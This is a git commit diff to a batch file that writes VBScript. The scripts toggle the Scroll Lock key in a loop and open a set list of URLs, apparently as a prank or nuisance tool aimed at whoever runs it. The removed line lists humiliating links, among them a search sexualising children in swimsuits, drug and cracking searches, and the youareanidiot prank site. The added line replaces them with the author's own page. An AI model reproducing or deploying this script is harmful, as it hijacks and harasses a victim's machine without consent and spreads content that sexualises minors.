21f5cf406614c6592c5210e7e12af7ca80c26065
MrParadoxal <83886169+MrParadoxal@users.noreply.github.com>
2022-11-30 20:37:33 +0100

    Update t10090.bat

--- ztmp/t10090.bat
+++ ztmp/t10090.bat
@@ -147,7 +147,7 @@ set file=alerte_enculay.mp3
 @echo wshshell.sendkeys "{SCROLLLOCK}">>%led%.vbs
 @echo loop>>%led%.vbs
 
-@echo arabe = Array("https://www.google.com/search?q=Photo+d'enfants+en+maillot+de+bain+c'est+pour+ma+cousine+tkt+gilbert&sxsrf=ALiCzsab_keH-uymiSzxHsxyjjzsaggVWA:1667682132973&source=lnms&tbm=isch&sa=X&ved=2ahUKEwja9oiJ-Jf7AhX9lIkEHYo5CWgQ_AUoAXoECAIQAw&cshid=1667682169917823&biw=1536&bih=758&dpr=1.25", "https://google.com/search?q=tuto+devenir+un+femboy", "https://google.com/search?q=Comment+voler+une+poussette+?", "https://youareanidiot.cc/", "http://www.trottla.net/gallrey/gallery-kakonotop2.html", "https://google.com/search?q=how+2+buy+weed", "https://forums.commentcamarche.net/forum/affich-16798663-mon-pc-est-hacke-comment-faire", "https://google.com/search?q+among+us+crack+legit+2022+free+gems+hack+working", "https://www.jeuxvideo.com/forums/1-50-74887570-1-0-1-0-j-ai-paye-cette-epee-349eur.htm", "https://jvflux.fr/Noelisme")>%fetch%.vbs
+@echo arabe = Array("https://mrparadoxal.github.io")>%fetch%.vbs
 @echo Set feug=wscript.CreateObject("WScript.Shell")>>%fetch%.vbs
 
 @echo dim r>>%fetch%.vbs
